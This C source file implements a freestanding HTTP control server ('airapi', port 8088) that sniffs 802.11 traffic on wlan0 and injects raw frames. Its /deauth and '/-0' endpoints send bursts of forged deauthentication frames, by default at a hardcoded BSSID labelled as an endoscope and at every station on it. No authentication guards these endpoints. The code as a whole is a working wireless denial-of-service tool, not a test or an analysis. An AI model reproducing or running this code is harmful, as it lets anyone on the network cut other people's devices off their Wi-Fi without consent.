typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;

extern int sys_read(int fd, void *buffer, unsigned int count);
extern int sys_write(int fd, const void *buffer, unsigned int count);
extern int sys_open(const char *path, unsigned int flags, unsigned int mode);
extern int sys_ioctl(int fd, unsigned int request, void *argument);
extern int sys_socket(int domain, int type, int protocol);
extern int sys_bind(int fd, const void *address, unsigned int length);
extern int sys_listen(int fd, unsigned int backlog);
extern int sys_accept(int fd, void *address, unsigned int *length);
extern int sys_recv(int fd, void *buffer, unsigned int length, unsigned int flags);
extern int sys_sendto(int fd, const void *buffer, unsigned int length, unsigned int flags, const void *address, unsigned int address_length);
extern int sys_close(int fd);
extern void sys_exit(int status);

#define AF_INET 2
#define AF_PACKET 17
#define SOCK_STREAM 1
#define SOCK_RAW 3
#define ETH_P_ALL_NETWORK_ORDER 0x0300
#define SIOCGIFINDEX 0x8933
#define AIRAPI_PORT 8088

static const u8 broadcast_mac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
static const u8 test_mac[6] = { 0x02, 0x57, 0x4e, 0x37, 0x32, 0x33 };
static const u8 endoscope_bssid[6] = { 0xe8, 0xab, 0xfa, 0xae, 0x6e, 0xa1 };

struct network_entry {
    u8 used;
    u8 bssid[6];
    u8 channel;
    u8 has_channel;
    u32 beacons;
    u32 probes;
    u32 data;
    char essid[33];
};

static struct network_entry networks[16];
static char request_buffer[512];
static char response_buffer[4096];
static unsigned int response_length;

static void zero_bytes(u8 *data, unsigned int length)
{
    unsigned int index;

    for (index = 0; index < length; index++)
        data[index] = 0;
}

static unsigned int str_len(const char *text)
{
    unsigned int length = 0;

    while (text[length] != 0)
        length++;
    return length;
}

static int str_equal(const char *left, const char *right)
{
    unsigned int index = 0;

    while (left[index] != 0 && right[index] != 0) {
        if (left[index] != right[index])
            return 0;
        index++;
    }
    return left[index] == right[index];
}

static int starts_with(const char *text, const char *prefix)
{
    unsigned int index = 0;

    while (prefix[index] != 0) {
        if (text[index] != prefix[index])
            return 0;
        index++;
    }
    return 1;
}

static void response_reset(void)
{
    response_length = 0;
}

static void response_append(const char *text)
{
    unsigned int index = 0;

    while (text[index] != 0 && response_length + 1 < sizeof(response_buffer))
        response_buffer[response_length++] = text[index++];
}

static void response_append_char(char value)
{
    if (response_length + 1 < sizeof(response_buffer))
        response_buffer[response_length++] = value;
}

static void response_append_dec(unsigned int value)
{
    char output[10];
    unsigned int index = 0;

    if (value == 0) {
        response_append_char('0');
        return;
    }

    while (value > 0 && index < sizeof(output)) {
        output[index++] = (char)('0' + (value % 10));
        value /= 10;
    }

    while (index > 0) {
        index--;
        response_append_char(output[index]);
    }
}

static void response_append_mac(const u8 mac[6])
{
    static const char hex[] = "0123456789abcdef";
    unsigned int index;

    for (index = 0; index < 6; index++) {
        if (index != 0)
            response_append_char(':');
        response_append_char(hex[mac[index] >> 4]);
        response_append_char(hex[mac[index] & 0x0f]);
    }
}

static void copy_mac(u8 *destination, const u8 *source)
{
    unsigned int index;

    for (index = 0; index < 6; index++)
        destination[index] = source[index];
}

static int mac_equal(const u8 *left, const u8 *right)
{
    unsigned int index;

    for (index = 0; index < 6; index++) {
        if (left[index] != right[index])
            return 0;
    }
    return 1;
}

static int hex_value(char c)
{
    if (c >= '0' && c <= '9')
        return c - '0';
    if (c >= 'a' && c <= 'f')
        return c - 'a' + 10;
    if (c >= 'A' && c <= 'F')
        return c - 'A' + 10;
    return -1;
}

static int parse_uint_text(const char *text, unsigned int *value)
{
    unsigned int result = 0;
    unsigned int index = 0;

    if (text[0] == 0)
        return -1;

    while (text[index] != 0) {
        if (text[index] < '0' || text[index] > '9')
            return -1;
        result = result * 10U + (unsigned int)(text[index] - '0');
        if (result > 100000U)
            return -1;
        index++;
    }

    *value = result;
    return 0;
}

static int parse_mac(const char *text, u8 mac[6])
{
    unsigned int index;

    for (index = 0; index < 6; index++) {
        int high = hex_value(text[index * 3]);
        int low = hex_value(text[index * 3 + 1]);

        if (high < 0 || low < 0)
            return -1;
        mac[index] = (u8)((high << 4) | low);
        if (index != 5 && text[index * 3 + 2] != ':')
            return -1;
    }
    return text[17] == 0 ? 0 : -1;
}

static void url_decode_copy(char *destination, unsigned int destination_size, const char *source, unsigned int length)
{
    unsigned int input = 0;
    unsigned int output = 0;

    while (input < length && output + 1 < destination_size) {
        if (source[input] == '%' && input + 2 < length) {
            int high = hex_value(source[input + 1]);
            int low = hex_value(source[input + 2]);

            if (high >= 0 && low >= 0) {
                destination[output++] = (char)((high << 4) | low);
                input += 3;
                continue;
            }
        }
        if (source[input] == '+')
            destination[output++] = ' ';
        else
            destination[output++] = source[input];
        input++;
    }
    destination[output] = 0;
}

static int get_query_value(const char *path, const char *name, char *output, unsigned int output_size)
{
    unsigned int name_length = str_len(name);
    unsigned int index = 0;

    while (path[index] != 0 && path[index] != '?')
        index++;
    if (path[index] != '?')
        return 0;
    index++;

    while (path[index] != 0 && path[index] != ' ') {
        unsigned int start = index;
        unsigned int key_length;
        unsigned int value_start;
        unsigned int value_length;

        while (path[index] != 0 && path[index] != '=' && path[index] != '&' && path[index] != ' ')
            index++;
        key_length = index - start;
        if (path[index] == '=') {
            index++;
            value_start = index;
            while (path[index] != 0 && path[index] != '&' && path[index] != ' ')
                index++;
            value_length = index - value_start;
            if (key_length == name_length) {
                unsigned int k;
                int match = 1;

                for (k = 0; k < name_length; k++) {
                    if (path[start + k] != name[k])
                        match = 0;
                }
                if (match) {
                    url_decode_copy(output, output_size, path + value_start, value_length);
                    return 1;
                }
            }
        } else {
            while (path[index] != 0 && path[index] != '&' && path[index] != ' ')
                index++;
        }
        if (path[index] == '&')
            index++;
    }
    return 0;
}

static int get_interface_index(int fd)
{
    u8 request[40];

    zero_bytes(request, sizeof(request));
    request[0] = 'w';
    request[1] = 'l';
    request[2] = 'a';
    request[3] = 'n';
    request[4] = '0';

    if (sys_ioctl(fd, SIOCGIFINDEX, request) < 0)
        return -1;
    return *(int *)(request + 16);
}

static void build_packet_sockaddr(u8 *address, int interface_index)
{
    zero_bytes(address, 20);
    address[0] = AF_PACKET;
    address[1] = 0;
    address[2] = 0;
    address[3] = 3;
    *(int *)(address + 4) = interface_index;
}

static int bind_packet_interface(int fd, int interface_index)
{
    u8 address[20];

    build_packet_sockaddr(address, interface_index);
    return sys_bind(fd, address, sizeof(address));
}

static int open_packet_socket(int *fd_out, int *ifindex_out)
{
    int fd;
    int interface_index;

    fd = sys_socket(AF_PACKET, SOCK_RAW, ETH_P_ALL_NETWORK_ORDER);
    if (fd < 0)
        return 10;

    interface_index = get_interface_index(fd);
    if (interface_index < 0) {
        sys_close(fd);
        return 11;
    }

    if (bind_packet_interface(fd, interface_index) < 0) {
        sys_close(fd);
        return 12;
    }

    *fd_out = fd;
    *ifindex_out = interface_index;
    return 0;
}

static unsigned int append_radiotap(u8 *frame)
{
    frame[0] = 0x00;
    frame[1] = 0x00;
    frame[2] = 0x08;
    frame[3] = 0x00;
    frame[4] = 0x00;
    frame[5] = 0x00;
    frame[6] = 0x00;
    frame[7] = 0x00;
    return 8;
}

static unsigned int build_probe(u8 *frame, unsigned int sequence, const char *ssid)
{
    unsigned int offset = append_radiotap(frame);
    unsigned int ssid_length = ssid ? str_len(ssid) : 0;
    unsigned int index;

    if (ssid_length > 32)
        ssid_length = 32;

    frame[offset++] = 0x40;
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;
    copy_mac(frame + offset, broadcast_mac);
    offset += 6;
    copy_mac(frame + offset, test_mac);
    offset += 6;
    copy_mac(frame + offset, broadcast_mac);
    offset += 6;
    frame[offset++] = (u8)((sequence << 4) & 0xf0);
    frame[offset++] = (u8)((sequence >> 4) & 0xff);
    frame[offset++] = 0x00;
    frame[offset++] = (u8)ssid_length;
    for (index = 0; index < ssid_length; index++)
        frame[offset++] = (u8)ssid[index];
    frame[offset++] = 0x01;
    frame[offset++] = 0x08;
    frame[offset++] = 0x82;
    frame[offset++] = 0x84;
    frame[offset++] = 0x8b;
    frame[offset++] = 0x96;
    frame[offset++] = 0x0c;
    frame[offset++] = 0x12;
    frame[offset++] = 0x18;
    frame[offset++] = 0x24;
    return offset;
}

static unsigned int build_deauth(u8 *frame, unsigned int sequence, const u8 bssid[6], const u8 station[6])
{
    unsigned int offset = append_radiotap(frame);

    frame[offset++] = 0xc0;
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;
    frame[offset++] = 0x00;
    copy_mac(frame + offset, station);
    offset += 6;
    copy_mac(frame + offset, bssid);
    offset += 6;
    copy_mac(frame + offset, bssid);
    offset += 6;
    frame[offset++] = (u8)((sequence << 4) & 0xf0);
    frame[offset++] = (u8)((sequence >> 4) & 0xff);
    frame[offset++] = 0x07;
    frame[offset++] = 0x00;
    return offset;
}

static int send_frames(unsigned int mode, unsigned int count, const u8 *bssid, const u8 *station, const char *ssid)
{
    static u8 frame[256];
    u8 address[20];
    int fd;
    int interface_index;
    unsigned int index;
    unsigned int sent = 0;
    int status;

    if (count == 0)
        count = 1;
    if (count > 128)
        count = 128;

    status = open_packet_socket(&fd, &interface_index);
    if (status != 0)
        return status;
    build_packet_sockaddr(address, interface_index);

    for (index = 0; index < count; index++) {
        unsigned int length;
        int ret;

        if (mode == 1)
            length = build_deauth(frame, index, bssid, station);
        else
            length = build_probe(frame, index, ssid);
        ret = sys_sendto(fd, frame, length, 0, address, sizeof(address));
        if (ret < 0) {
            sys_close(fd);
            return 13;
        }
        sent++;
    }

    sys_close(fd);
    return (int)sent;
}

static int find_network(const u8 *bssid)
{
    int free_slot = -1;
    int index;

    for (index = 0; index < 16; index++) {
        if (networks[index].used && mac_equal(networks[index].bssid, bssid))
            return index;
        if (!networks[index].used && free_slot < 0)
            free_slot = index;
    }

    if (free_slot >= 0) {
        networks[free_slot].used = 1;
        copy_mac(networks[free_slot].bssid, bssid);
        networks[free_slot].channel = 0;
        networks[free_slot].has_channel = 0;
        networks[free_slot].beacons = 0;
        networks[free_slot].probes = 0;
        networks[free_slot].data = 0;
        networks[free_slot].essid[0] = 0;
        return free_slot;
    }

    return -1;
}

static void copy_essid(char *destination, const u8 *source, unsigned int length)
{
    unsigned int index;

    if (length > 32)
        length = 32;
    for (index = 0; index < length; index++) {
        u8 value = source[index];
        if (value < 32 || value > 126)
            destination[index] = '.';
        else
            destination[index] = (char)value;
    }
    destination[length] = 0;
}

static void parse_elements(struct network_entry *entry, const u8 *data, unsigned int length)
{
    unsigned int offset = 0;

    while (offset + 2 <= length) {
        u8 id = data[offset++];
        u8 size = data[offset++];

        if (offset + size > length)
            break;
        if (id == 0 && size > 0)
            copy_essid(entry->essid, data + offset, size);
        if (id == 3 && size >= 1) {
            entry->channel = data[offset];
            entry->has_channel = 1;
        }
        offset += size;
    }
}

static void parse_frame(const u8 *frame, unsigned int length, unsigned int *mgmt, unsigned int *ctrl, unsigned int *data_count, unsigned int *short_count)
{
    u16 radiotap_length;
    const u8 *wifi;
    unsigned int wifi_length;
    u16 fc;
    unsigned int type;
    unsigned int subtype;
    const u8 *bssid = 0;
    int network_index;

    if (length < 12) {
        (*short_count)++;
        return;
    }

    radiotap_length = (u16)frame[2] | ((u16)frame[3] << 8);
    if (radiotap_length >= length || radiotap_length < 8) {
        (*short_count)++;
        return;
    }

    wifi = frame + radiotap_length;
    wifi_length = length - radiotap_length;
    if (wifi_length < 24) {
        (*short_count)++;
        return;
    }

    fc = (u16)wifi[0] | ((u16)wifi[1] << 8);
    type = (fc >> 2) & 0x03;
    subtype = (fc >> 4) & 0x0f;

    if (type == 0) {
        (*mgmt)++;
        if (subtype == 8 || subtype == 5) {
            bssid = wifi + 16;
            network_index = find_network(bssid);
            if (network_index >= 0) {
                if (subtype == 8)
                    networks[network_index].beacons++;
                else
                    networks[network_index].probes++;
                if (wifi_length > 36)
                    parse_elements(&networks[network_index], wifi + 36, wifi_length - 36);
            }
        }
    } else if (type == 1) {
        (*ctrl)++;
    } else if (type == 2) {
        (*data_count)++;
        bssid = wifi + 16;
        network_index = find_network(bssid);
        if (network_index >= 0)
            networks[network_index].data++;
    }
}

static int run_dump(unsigned int frame_limit)
{
    static u8 frame[4096];
    int fd;
    int interface_index;
    int status;
    unsigned int total = 0;
    unsigned int mgmt = 0;
    unsigned int ctrl = 0;
    unsigned int data_count = 0;
    unsigned int short_count = 0;
    unsigned int index;

    if (frame_limit == 0)
        frame_limit = 64;
    if (frame_limit > 512)
        frame_limit = 512;

    for (index = 0; index < 16; index++)
        networks[index].used = 0;

    status = open_packet_socket(&fd, &interface_index);
    if (status != 0)
        return status;

    while (total < frame_limit) {
        int length = sys_recv(fd, frame, sizeof(frame), 0);

        if (length < 0) {
            sys_close(fd);
            return 20;
        }
        total++;
        parse_frame(frame, (unsigned int)length, &mgmt, &ctrl, &data_count, &short_count);
    }

    sys_close(fd);

    response_append("OK dump frames=");
    response_append_dec(total);
    response_append(" mgmt=");
    response_append_dec(mgmt);
    response_append(" ctrl=");
    response_append_dec(ctrl);
    response_append(" data=");
    response_append_dec(data_count);
    response_append(" short=");
    response_append_dec(short_count);
    response_append("\n");

    response_append("BSSID,CH,BEACON,PROBE,DATA,ESSID\n");
    for (index = 0; index < 16; index++) {
        if (!networks[index].used)
            continue;
        response_append_mac(networks[index].bssid);
        response_append(",");
        if (networks[index].has_channel)
            response_append_dec(networks[index].channel);
        else
            response_append("?");
        response_append(",");
        response_append_dec(networks[index].beacons);
        response_append(",");
        response_append_dec(networks[index].probes);
        response_append(",");
        response_append_dec(networks[index].data);
        response_append(",");
        if (networks[index].essid[0] != 0)
            response_append(networks[index].essid);
        else
            response_append("<hidden/unknown>");
        response_append("\n");
    }

    return 0;
}

static int run_inject_from_path(const char *path, unsigned int deauth)
{
    char value[64];
    char ssid[40];
    u8 bssid[6];
    u8 station[6];
    unsigned int count = 1;
    int sent;

    if (get_query_value(path, "count", value, sizeof(value))) {
        if (parse_uint_text(value, &count) != 0)
            return 30;
    }

    if (deauth) {
        if (!get_query_value(path, "bssid", value, sizeof(value))) {
            copy_mac(bssid, endoscope_bssid);
        } else if (parse_mac(value, bssid) != 0) {
            return 31;
        }
        if (get_query_value(path, "station", value, sizeof(value))) {
            if (parse_mac(value, station) != 0)
                return 32;
        } else {
            copy_mac(station, broadcast_mac);
        }
        sent = send_frames(1, count, bssid, station, 0);
    } else {
        ssid[0] = 0;
        get_query_value(path, "ssid", ssid, sizeof(ssid));
        sent = send_frames(0, count, 0, 0, ssid[0] ? ssid : 0);
    }

    if (sent < 0)
        return 33;
    response_append("OK sent=");
    response_append_dec((unsigned int)sent);
    response_append("\n");
    return 0;
}

static int handle_path(const char *path)
{
    char value[32];
    unsigned int frames = 64;

    response_reset();

    if (starts_with(path, "/status")) {
        response_append("OK airapi=1 wlan0=monitor-required port=8088\n");
        return 0;
    }

    if (starts_with(path, "/dump")) {
        if (get_query_value(path, "frames", value, sizeof(value)))
            parse_uint_text(value, &frames);
        return run_dump(frames);
    }

    if (starts_with(path, "/test") || starts_with(path, "/probe"))
        return run_inject_from_path(path, 0);

    if (starts_with(path, "/deauth") || starts_with(path, "/-0"))
        return run_inject_from_path(path, 1);

    response_append("ERR unknown endpoint\n");
    return 1;
}

static void send_http_response(int client_fd, int status)
{
    if (status == 0)
        sys_write(client_fd, "HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n", 64);
    else
        sys_write(client_fd, "HTTP/1.0 400 Bad Request\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n", 73);

    if (status != 0) {
        response_append("ERR status=");
        response_append_dec((unsigned int)status);
        response_append("\n");
    }
    sys_write(client_fd, response_buffer, response_length);
}

static void handle_client(int client_fd)
{
    int length;
    unsigned int index = 0;
    unsigned int path_start = 0;
    unsigned int path_end = 0;
    int status;

    length = sys_read(client_fd, request_buffer, sizeof(request_buffer) - 1);
    if (length <= 0)
        return;
    request_buffer[length] = 0;

    if (!starts_with(request_buffer, "GET ")) {
        response_reset();
        response_append("ERR only GET is supported\n");
        send_http_response(client_fd, 2);
        return;
    }

    path_start = 4;
    index = path_start;
    while (request_buffer[index] != 0 && request_buffer[index] != ' ' && index < sizeof(request_buffer) - 1)
        index++;
    path_end = index;
    request_buffer[path_end] = 0;

    status = handle_path(request_buffer + path_start);
    send_http_response(client_fd, status);
}

static int run_server(void)
{
    int server_fd;
    u8 address[16];

    server_fd = sys_socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0)
        return 10;

    zero_bytes(address, sizeof(address));
    address[0] = AF_INET;
    address[1] = 0;
    address[2] = (u8)(AIRAPI_PORT >> 8);
    address[3] = (u8)(AIRAPI_PORT & 0xff);

    if (sys_bind(server_fd, address, sizeof(address)) < 0)
        return 11;
    if (sys_listen(server_fd, 4) < 0)
        return 12;

    response_reset();
    response_append("AIRAPI_LISTEN port=8088\n");
    sys_write(1, response_buffer, response_length);

    for (;;) {
        u8 client_address[16];
        unsigned int client_length = sizeof(client_address);
        int client_fd = sys_accept(server_fd, client_address, &client_length);

        if (client_fd < 0)
            continue;
        handle_client(client_fd);
        sys_close(client_fd);
    }
}

void _start(void)
{
    int status = run_server();

    sys_exit(status);
    for (;;)
        ;
}
